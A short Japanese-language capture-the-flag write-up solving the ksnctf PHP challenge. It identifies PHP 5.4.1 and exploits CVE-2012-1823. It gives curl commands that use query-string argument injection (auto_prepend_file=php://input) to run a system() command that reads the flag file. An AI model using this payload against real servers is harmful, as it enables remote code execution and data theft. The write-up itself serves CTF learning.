## ksnctf

### Hypertext Preprocessor 70pt
https://ksnctf.sweetduet.info/problem/12

* keywords
  - Web、PHP
* 解法
  - ページ開いてみる
  - 何度か更新すると時間っぽい
  - でもよく分からん
  - 2012から始まっていてさらによく分からないのでぐぐる
  - [CVE-2012-1823]( https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823 )という脆弱性が見つかる
    - PHP 5.4.2より前で存在する脆弱性らしい
    - [徳丸浩の日記: CGI版PHPにリモートからスクリプト実行を許す脆弱性(CVE-2012-1823)]( https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html )
    - [もっとも悪用されたPHPの脆弱性CVE-2012-1823を検証する]( https://www.youtube.com/watch?v=XiIPXQX8RRU&feature=emb_title )
  - `$ curl -v http://ctfq.sweetduet.info:10080/~q12/` してみると `X-Powered-By: PHP/5.4.1` というヘッダーがレスポンスにあるので上記脆弱性がありそう
  - ということでこの脆弱性を使ってみる
    - 試しにまず `?-s` を付けてみる
      - `curl -v "http://ctfq.sweetduet.info:10080/~q12/?-s"` か直接アクセス
      - ソースが見れて、このディレクトリにflagの情報があることがわかる
    - 最終的には以下をやる
      ```bash
      $ curl -v --data-binary "<?php system('cat flag_flag_flag.txt');?>" "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input"
      ```
